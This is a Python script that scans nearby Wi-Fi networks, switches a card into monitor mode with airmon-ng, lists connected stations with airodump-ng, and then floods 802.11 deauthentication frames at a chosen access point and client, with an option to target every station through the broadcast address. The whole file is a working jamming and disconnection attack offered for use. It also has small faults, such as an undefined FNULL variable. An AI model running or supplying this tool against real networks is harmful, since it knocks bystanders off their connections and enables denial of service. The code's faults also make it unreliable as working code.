from scapy.all import *
from wifi import Cell
import time
from wireless import Wireless
import os
import sys
from subprocess import Popen, PIPE

DN = open(os.devnull, 'w')

# Network scanner
def network_scan():
    wifi_card = Wireless()
    interface = wifi_card.interface()
    wifi_collect = Cell.all(interface)
    print ("Available networks scan in progress ...")
    print ("#" * 70)
    bssid = []
    time.sleep(2)
    numero = 0
    for wi in wifi_collect:
        print("Network number: " + str(numero))
        print("SSID: " + wi.ssid)
        print("BSSID: " + wi.address)
        print("Channel: " + str(wi.channel))
        #print("Quality: " + str(wi.quality))
        print("+-" * 10)
        bssid.append(wi.address)
        time.sleep(0.5)
        numero += 1
    print ("#" * 70)
    return bssid

def jam(address, card, client):
	conf.verb = 0  # shut up Scapy
	packet = RadioTap()/Dot11(addr1=client,addr2=address,addr3=address)/Dot11Deauth()
	print("Jamming network: " + address)
	sendp(packet, iface = card, count=10000000000, inter=0.001, loop=1) #Send deauth packet
	subprocess.call('airmon-ng stop {}'.format(card), shell=True)
	print('\nEnd of jammer.')
	sys.exit()

if __name__ == "__main__":
	bssid = network_scan()

	red = input("Tell me the network number you want to jam: ")

    #Call airmon-ng to show the user a list of available network cards on their device
	subprocess.call('airmon-ng', shell=True)

    #start up monitor mode on a network card
	networkCard = input('Please enter the name of the network card you wish to use: ')

	#Kill all processes that can interrupt
	subprocess.call('airmon-ng check kill', stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    #Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any process that may be interfering with the network card
	subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)

    #Call airmon-ng to show the user a list of available network cards on their device
	subprocess.call('airmon-ng', shell=True)

	card = input('Please enter the name of the monitor mode network card you wish to use: ')

	bssid_selected = bssid[int(red)]

	try:
		subprocess.call('airodump-ng --bssid {} {}'.format(bssid_selected,card), shell=True) #Call airodump-ng to show stations conected
	except KeyboardInterrupt:
		print('\n')

	client = input('Please enter the station you want to jam(write FF:FF:FF:FF:FF:FF if you want to jam all stations): ')

	jam(bssid[int(red)], card, client)
